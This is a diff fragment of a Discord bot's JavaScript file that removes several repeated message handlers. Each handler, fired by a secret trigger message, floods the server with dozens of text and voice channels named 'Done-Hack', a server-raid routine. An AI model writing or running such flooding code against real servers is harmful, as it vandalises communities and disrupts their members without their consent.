-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-
-
- }
-
-});
-client.on('message', message => {
- if (message.content === x_x) {
-  if (!message.channel.guild) return;
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-
-
- }
-
-});
-client.on('message', message => {
- if (message.content === x_x) {
-  if (!message.channel.guild) return;
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-
-
- }
-
-});
-client.on('message', message => {
- if (message.content === x_x) {
-  if (!message.channel.guild) return;
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-
-
- }
-
-});
-client.on('message', message => {
- if (message.content === x_x) {
-  if (!message.channel.guild) return;
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-
-
- }
-
-});
-client.on('message', message => {
- if (message.content === x_x) {
-  if (!message.channel.guild) return;
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-
-
- }
-
-});
-client.on('message', message => {
- if (message.content === x_x) {
-  if (!message.channel.guild) return;
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-
-
- }
-
-});
-client.on('message', message => {
- if (message.content === x_x) {
-  if (!message.channel.guild) return;
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-  message.guild.createChannel('Done-Hack', 'text');
-  message.guild.createChannel('Done-Hack', 'voice');
-
-
- }
-
-});
 
 
 
@@ -2718,4 +1301,4 @@ client.on('message', message => {
 
 
 	  
-client.login(process.env.BOT_TOKEN);  
+client.login(process.env.BOT_TOKEN);
